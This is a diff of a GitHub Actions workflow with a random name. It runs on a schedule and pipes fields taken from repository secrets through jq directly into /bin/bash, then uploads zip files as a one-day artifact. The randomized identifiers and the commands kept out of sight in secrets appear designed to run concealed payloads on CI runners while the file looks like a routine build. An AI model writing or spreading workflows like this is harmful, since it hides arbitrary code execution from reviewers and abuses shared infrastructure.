@@ -1,34 +1,25 @@
 name: facadetailwind41
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '35 0/6 * * *'
+    - cron: '2 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: facadetailwind41
         env:
-          skpfo7569: ${{ secrets.skpfo7569 }}
+          qv30616: ${{ secrets.qv30616 }}
         run: |
-          echo $skpfo7569 | jq -r .jbwac4170 | /bin/bash
-          echo $htp8 | jq -r .cqk5 | /bin/bash
-          echo $g82 | jq -r .cl9 | /bin/bash
-          echo $wuibg4 | jq -r .cizgq0 | /bin/bash
-          echo $fx845 | jq -r .eknl9733 | /bin/bash
-          echo $wfeys96 | jq -r .yc21 | /bin/bash
-          echo $ju01792 | jq -r .ca972 | /bin/bash
-          echo $iph7 | jq -r .iuoaq530 | /bin/bash
-          echo $ht5 | jq -r .pm0913 | /bin/bash
-          echo $zezhv46808 | jq -r .ft02 | /bin/bash
-          echo $i742 | jq -r .oorm306 | /bin/bash
-          echo $uttb5 | jq -r .vrffs59 | /bin/bash
-          echo $bbg6 | jq -r .znj053 | /bin/bash
-          echo $iu4164 | jq -r .iqe39915 | /bin/bash
-          echo $qnvse389 | jq -r .ma8 | /bin/bash
-          echo $dtic8 | jq -r .tp25181 | /bin/bash
-          echo $n4 | jq -r .o9294 | /bin/bash
+          printf '%s' "$qv30616" | jq -r .vjprn92713 | /bin/bash
+          printf '%s' "$pbu92435" | jq -r .ylf63 | /bin/bash
+          printf '%s' "$fiv7213" | jq -r .j40 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: RySGTTBN
+          path: "*.zip"
+          retention-days: 1
